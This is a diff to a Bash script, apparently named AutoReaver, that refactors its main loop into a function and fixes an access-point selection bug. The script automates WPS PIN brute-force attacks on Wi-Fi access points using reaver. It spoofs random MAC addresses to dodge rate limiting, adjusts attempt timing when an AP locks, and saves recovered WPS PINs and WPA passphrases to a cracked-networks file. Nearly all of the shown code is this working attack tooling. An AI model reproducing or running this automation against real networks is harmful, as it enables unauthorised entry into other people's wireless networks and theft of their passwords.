@@ -23,6 +23,9 @@
 ###### Airmon-ng, Aireplay-ng
 ###### Konsole
 ###### Wash
+###### Sed, Curl
+###### Gawk
+###### MDK3
 ###################################################################################################################################################
 ###### DBus Server launch ERROR issue, please visit https://www.kali.org/docs/general-use/xfce-with-rdp/
 ###################################################################################################################################################
@@ -226,7 +229,7 @@ setAPSettings(){
 	while true; do
 		read -p "Choose AP (1-$(($COUNTAP-2))), (0) to All, (R)escan : " APCHOICE;
 
-		if [[ $APCHOICE -le $COUNTAP-2 && $APCHOICE -ge 1 ]]; then
+		if [[ $APCHOICE -le $(($COUNTAP-2)) && $APCHOICE -ge 1 ]]; then
 			AP_BSSID=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $1 }');
 			AP_CHANNEL=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $2 }');
 			AP_ESSID=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $7 }');
@@ -677,6 +680,187 @@ exitAutoReaver(){
 	exit 0;
 }
 
+autoReaver(){
+	local PROCEED=0;
+	local CMD_REAVER;
+	local CMD_FAUTH;
+	local WPS_PIN;
+	local WPA_PSK;
+	local STATUS_LINE
+	local REAVER_OUTPUT
+
+	clear;
+
+	while true; do
+		PROCEED=0;
+
+		echoWhite "Device Settings......";
+		echo "";
+		setDeviceSettings;
+		clear;
+
+		startMonitor;
+		echoWhite "AP Settings......";
+		echo "";
+		setAPSettings;
+		clear;
+
+		echoWhite "AutoReaver Settings......";
+		echo "";
+		setAutoReaverOpt;
+		clear;
+
+		echoWhite "Device Settings --------------------------------------------------------------------";
+		echoBlue "Device Driver:							$WIFI_CARD_DRIVER";
+		echoBlue "Device Logical: 						$WIFI_CARD_LOGICAL";
+		echoBlue "Device Physical:						$WIFI_CARD_PHY";
+		echoBlue "Device Monitor:							$WIFI_CARD_MONITOR";
+		echoWhite "AP Settings ------------------------------------------------------------------------";
+		echoBlue "BSSID:								$AP_BSSID";
+		echoBlue "Channel:							$AP_CHANNEL";
+		echoBlue "WPS:								$AP_WPS";
+		echoBlue "Lock State:							$AP_LOCK";
+		echoBlue "ESSID:								$AP_ESSID";
+		echoWhite "Reaver/Aireplay-ng Settings --------------------------------------------------------";
+		echoBlue "Aireplay-ng Fake Authentication Delay:				$FAKE_AUTH_DELAY_SECONDS";
+		echoBlue "Reaver PIN Attempts before MAC Changing:			$REAVER_PIN_ATTEMPTS";
+		echoBlue "Reaver Delay Between PIN Attempts:				$REAVER_ATTEMPT_DELAY";
+		echoBlue "Reaver Additional Options (-E -S -N -T 1 -t 15 --win7): 	$ADDITIONAL_OPTIONS_YN";
+		echo "";
+
+		while true; do
+			read -p "Proceed (Y/N)?" yn;
+
+			case $yn in
+				[Yy]* )
+					PROCEED=1;
+					break;;
+				[Nn]* )
+					clear;
+					break;;
+				* )
+					echoOrange "Please Answer Yes or No......";;
+			esac
+		done
+
+		if [[ $PROCEED -eq 1 ]]; then
+			PROCEED=0;
+			break;
+		fi
+	done
+
+	clear;
+
+	stopMonitor && resetDeviceDriver && getRandomMac &&  startMonitor;
+
+	BSSID_CLEAR=$(echo $AP_BSSID | sed s/://g);
+	SESSION_FILE=$REAVER_SESSION_DIR'/'$BSSID_CLEAR'.session';
+	STATUS_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.status'
+
+	if [[ ! -f $STATUS_FILE ]]; then
+		touch $STATUS_FILE;
+		echoGreen "Status File for $AP_BSSID Created......";
+	else
+		echoBlue "Status File for $AP_BSSID Found......";
+	fi
+
+	if [[ ! -f $CRACKED_LIST_FILE ]]; then
+		touch $CRACKED_LIST_FILE;
+		echoGreen "Cracked List File Created......";
+	else
+		echoBlue "Cracked List File Found......";
+	fi
+
+	sleep 2;
+
+	while true; do
+		#CMD_FAUTH="konsole --background-mode -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $WIFI_CARD_MONITOR'";
+		CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";
+
+		eval $CMD_REAVER | {
+			while read -r REAVER_OUTPUT; do
+
+				if [[ $(echo "$REAVER_OUTPUT" | grep -ic "detected ap rate limiting") -gt 0 ]]; then
+					echoRed "$REAVER_OUTPUT";
+					echo $(date +"%d/%m/%Y %H:%M:%S AP_RATE_LIMITING") >> $STATUS_FILE
+					$(killall -I reaver);
+				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps pin") -gt 0 ]]; then
+					echoGreen "$REAVER_OUTPUT";
+					echo $(date +"%d/%m/%Y %H:%M:%S WPS_PIN_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
+				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wpa psk") -gt 0 ]]; then
+					echoGreen "$REAVER_OUTPUT";
+					echo $(date +"%d/%m/%Y %H:%M:%S WPA_PSK_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
+				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "failed to recover wpa key") -gt 0 ]]; then
+					echoRed "$REAVER_OUTPUT";
+					echo $(date +"%d/%m/%Y %H:%M:%S FAILED_TO_RECOVER_WPA_KEY") >> $STATUS_FILE;
+				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "receive timeout occurred") -gt 0 ]]; then
+					echoOrange "$REAVER_OUTPUT";
+					echo $(date +"%d/%m/%Y %H:%M:%S RECEIVE_TIMEOUT") >> $STATUS_FILE;
+					$(killall -I reaver);
+				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "restored previous session") -gt 0 ]]; then
+					echoGreen "$REAVER_OUTPUT";
+				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps transaction failed") -gt 0 ]]; then
+									echoOrange "$REAVER_OUTPUT";
+					echo $(date +"%d/%m/%Y %H:%M:%S WPS_TRANSACTION_FAILED") >> $STATUS_FILE;
+				elif [[ $(echo "$REAVER_OUTPUT" | grep -icw "[!]") -eq 1 || $(echo "$REAVER_OUTPUT" | grep -icw "[-]") -gt 0 ]]; then
+					echoOrange "$REAVER_OUTPUT";
+					echo $(date +"%d/%m/%Y %H:%M:%S $REAVER_OUTPUT") >> $STATUS_FILE;
+				else
+					echoBlue "$REAVER_OUTPUT";
+				fi
+			done
+		}
+
+		if [[ "$(awk 'END {print $3}' $STATUS_FILE)" == "AP_RATE_LIMITING" ]]; then
+			if [[ "$AP_LOCK" == "Yes" ]]; then
+				unlockAP;
+
+				if [[ "$AP_LOCK" == "Yes" || "$AP_LOCK" == "NULL" ]]; then
+					break;
+				fi
+			else
+				if [[ $REAVER_ATTEMPT_DELAY -lt 60 ]]; then
+					REAVER_ATTEMPT_DELAY=60;
+					echo $(date +"%d/%m/%Y %H:%M:%S REAVER_ATTEMPT_DELAY_CHANGED_$REAVER_ATTEMPT_DELAY") >> $STATUS_FILE;
+				else
+					if [[ $REAVER_PIN_ATTEMPTS -gt 1 ]]; then
+						REAVER_PIN_ATTEMPTS=1;
+						echo $(date +"%d/%m/%Y %H:%M:%S REAVER_PIN_ATTEMPTS_CHANGED_$REAVER_PIN_ATTEMPTS") >> $STATUS_FILE;
+					fi
+
+					checkAPStatus;
+
+					if [[ "$AP_LOCK" == "Yes" ]]; then
+						unlockAP;
+
+						if [[ "$AP_LOCK" == "Yes"  || "$AP_LOCK" == "NULL" ]]; then
+							break;
+						fi
+					fi
+				fi
+			fi
+		elif [[ $(grep -icw 'wpa_psk_found' $STATUS_FILE) -gt 0 ]]; then
+			while read -r STATUS_LINE; do
+				if [[ $(echo "$STATUS_LINE" | grep -ic "wpa_psk_found") -gt 0 ]]; then
+					WPA_PSK=$(awk '{ print $4 }' <<< $STATUS_LINE);
+					WPA_PSK=$(echo $WPA_PSK | sed s/"'"//g);
+				elif [[ $(echo "$STATUS_LINE" | grep -ic "wps_pin_found") -gt 0 ]]; then
+					WPS_PIN=$(awk '{ print $4 }' <<< $STATUS_LINE);
+					WPS_PIN=$(echo $WPS_PIN | sed s/"'"//g);
+				fi
+			done < "$STATUS_FILE"
+
+			echo "$AP_BSSID $AP_CHANNEL $AP_ESSID $WPS_PIN $WPA_PSK" >> $CRACKED_LIST_FILE;
+			$(rm $SESSION_FILE) && $(rm $STATUS_FILE);
+			break;
+		fi
+
+		stopMonitor;
+		resetDeviceDriver;
+		getRandomMac;
+		startMonitor;
+	done
+}
 ###########################################################################################################################
 ###################################################### END FUNCTIONS ######################################################
 ###########################################################################################################################
@@ -702,177 +886,6 @@ fi
 
 checkRequisites;
 
-clear;
-
-while true; do
-	PROCEED=0;
-
-	echoWhite "Device Settings......";
-	echo "";
-	setDeviceSettings;
-	clear;
-
-	startMonitor;
-	echoWhite "AP Settings......";
-	echo "";
-	setAPSettings;
-	clear;
-
-	echoWhite "AutoReaver Settings......";
-	echo "";
-	setAutoReaverOpt;
-	clear;
-
-	echoWhite "Device Settings --------------------------------------------------------------------";
-	echoBlue "Device Driver:							$WIFI_CARD_DRIVER";
-	echoBlue "Device Logical: 						$WIFI_CARD_LOGICAL";
-	echoBlue "Device Physical:						$WIFI_CARD_PHY";
-	echoBlue "Device Monitor:							$WIFI_CARD_MONITOR";
-	echoWhite "AP Settings ------------------------------------------------------------------------";
-	echoBlue "BSSID:								$AP_BSSID";
-	echoBlue "Channel:							$AP_CHANNEL";
-	echoBlue "WPS:								$AP_WPS";
-	echoBlue "Lock State:							$AP_LOCK";
-	echoBlue "ESSID:								$AP_ESSID";
-	echoWhite "Reaver/Aireplay-ng Settings --------------------------------------------------------";
-	echoBlue "Aireplay-ng Fake Authentication Delay:				$FAKE_AUTH_DELAY_SECONDS";
-	echoBlue "Reaver PIN Attempts before MAC Changing:			$REAVER_PIN_ATTEMPTS";
-	echoBlue "Reaver Delay Between PIN Attempts:				$REAVER_ATTEMPT_DELAY";
-	echoBlue "Reaver Additional Options (-E -S -N -T 1 -t 15 --win7): 	$ADDITIONAL_OPTIONS_YN";
-	echo "";
-
-	while true; do
-		read -p "Proceed (Y/N)?" yn;
-
-		case $yn in
-			[Yy]* )
-				PROCEED=1;
-				break;;
-			[Nn]* )
-				clear;
-				break;;
-			* )
-				echoOrange "Please Answer Yes or No......";;
-		esac
-	done
-
-	if [[ $PROCEED -eq 1 ]]; then
-		PROCEED=0;
-		break;
-	fi
-done
-
-clear;
-
-stopMonitor && resetDeviceDriver && getRandomMac &&  startMonitor;
-
-BSSID_CLEAR=$(echo $AP_BSSID | sed s/://g);
-SESSION_FILE=$REAVER_SESSION_DIR'/'$BSSID_CLEAR'.session';
-STATUS_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.status'
-
-if [[ ! -f $STATUS_FILE ]]; then
-	touch $STATUS_FILE;
-	echoGreen "Status File for $AP_BSSID Created......";
-else
-	echoBlue "Status File for $AP_BSSID Found......";
-fi
-
-if [[ ! -f $CRACKED_LIST_FILE ]]; then
-	touch $CRACKED_LIST_FILE;
-	echoGreen "Cracked List File Created......";
-else
-	echoBlue "Cracked List File Found......";
-fi
-
-sleep 2;
-
-while true; do
-	#CMD_FAUTH="konsole --background-mode -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $WIFI_CARD_MONITOR'";
-	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";
-
-	eval $CMD_REAVER | {
-		while read -r REAVER_OUTPUT; do
-
-			if [[ $(echo "$REAVER_OUTPUT" | grep -ic "detected ap rate limiting") -gt 0 ]]; then
-				echoRed "$REAVER_OUTPUT";
-				echo $(date +"%d/%m/%Y %H:%M:%S AP_RATE_LIMITING") >> $STATUS_FILE
-				$(killall -I reaver);
-			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps pin") -gt 0 ]]; then
-				echoGreen "$REAVER_OUTPUT";
-				echo $(date +"%d/%m/%Y %H:%M:%S WPS_PIN_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
-			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wpa psk") -gt 0 ]]; then
-				echoGreen "$REAVER_OUTPUT";
-				echo $(date +"%d/%m/%Y %H:%M:%S WPA_PSK_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
-			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "failed to recover wpa key") -gt 0 ]]; then
-				echoRed "$REAVER_OUTPUT";
-				echo $(date +"%d/%m/%Y %H:%M:%S FAILED_TO_RECOVER_WPA_KEY") >> $STATUS_FILE;
-			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "receive timeout occurred") -gt 0 ]]; then
-				echoOrange "$REAVER_OUTPUT";
-				echo $(date +"%d/%m/%Y %H:%M:%S RECEIVE_TIMEOUT") >> $STATUS_FILE;
-				$(killall -I reaver);
-			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "restored previous session") -gt 0 ]]; then
-				echoGreen "$REAVER_OUTPUT";
-			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps transaction failed") -gt 0 ]]; then
-                                echoOrange "$REAVER_OUTPUT";
-				echo $(date +"%d/%m/%Y %H:%M:%S WPS_TRANSACTION_FAILED") >> $STATUS_FILE;
-			elif [[ $(echo "$REAVER_OUTPUT" | grep -icw "[!]") -eq 1 || $(echo "$REAVER_OUTPUT" | grep -icw "[-]") -gt 0 ]]; then
-				echoOrange "$REAVER_OUTPUT";
-				echo $(date +"%d/%m/%Y %H:%M:%S $REAVER_OUTPUT") >> $STATUS_FILE;
-			else
-				echoBlue "$REAVER_OUTPUT";
-			fi
-		done
-	}
-
-	if [[ "$(awk 'END {print $3}' $STATUS_FILE)" == "AP_RATE_LIMITING" ]]; then
-		if [[ "$AP_LOCK" == "Yes" ]]; then
-			unlockAP;
-
-			if [[ "$AP_LOCK" == "Yes" || "$AP_LOCK" == "NULL" ]]; then
-				break;
-			fi
-		else
-			if [[ $REAVER_ATTEMPT_DELAY -lt 60 ]]; then
-				REAVER_ATTEMPT_DELAY=60;
-				echo $(date +"%d/%m/%Y %H:%M:%S REAVER_ATTEMPT_DELAY_CHANGED_$REAVER_ATTEMPT_DELAY") >> $STATUS_FILE;
-			else
-				if [[ $REAVER_PIN_ATTEMPTS -gt 1 ]]; then
-					REAVER_PIN_ATTEMPTS=1;
-				fi
-
-				echo $(date +"%d/%m/%Y %H:%M:%S REAVER_PIN_ATTEMPTS_CHANGED_$REAVER_PIN_ATTEMPTS") >> $STATUS_FILE;
-
-				checkAPStatus;
-
-				if [[ "$AP_LOCK" == "Yes" ]]; then
-					unlockAP;
-
-					if [[ "$AP_LOCK" == "Yes"  || "$AP_LOCK" == "NULL" ]]; then
-						break;
-					fi
-				fi
-			fi
-		fi
-	elif [[ $(grep -icw 'wpa_psk_found' $STATUS_FILE) -gt 0 ]]; then
-		while read -r STATUS_LINE; do
-			if [[ $(echo "$STATUS_LINE" | grep -ic "wpa_psk_found") -gt 0 ]]; then
-				WPA_PSK=$(awk '{ print $4 }' <<< $STATUS_LINE);
-				WPA_PSK=$(echo $WPA_PSK | sed s/"'"//g);
-			elif [[ $(echo "$STATUS_LINE" | grep -ic "wps_pin_found") -gt 0 ]]; then
-				WPS_PIN=$(awk '{ print $4 }' <<< $STATUS_LINE);
-				WPS_PIN=$(echo $WPS_PIN | sed s/"'"//g);
-			fi
-		done < "$STATUS_FILE"
-
-		echo "$AP_BSSID $AP_CHANNEL $AP_ESSID $WPS_PIN $WPA_PSK" >> $CRACKED_LIST_FILE;
-		$(rm $SESSION_FILE) && $(rm $STATUS_FILE);
-		break;
-	fi
-
-	stopMonitor;
-	resetDeviceDriver;
-	getRandomMac;
-        startMonitor;
-done
+autoReaver;
 
 exitAutoReaver;
